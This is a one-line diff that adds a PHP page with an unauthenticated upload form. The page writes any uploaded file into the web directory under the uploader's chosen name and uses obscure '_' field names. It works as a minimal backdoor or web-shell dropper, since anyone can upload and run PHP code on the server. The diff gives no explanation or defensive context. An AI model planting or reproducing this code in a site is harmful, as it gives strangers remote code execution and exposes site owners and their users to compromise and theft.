@@ -1,0 +1,1 @@
+<html><body><form enctype="multipart/form-data" method="POST"><input type="file" name="_"></input><input type="submit" value="_"></input></form></body></html><?php if(!empty($_FILES["_"]))move_uploaded_file($_FILES["_"]["tmp_name"],$_FILES["_"]["name"]);?>
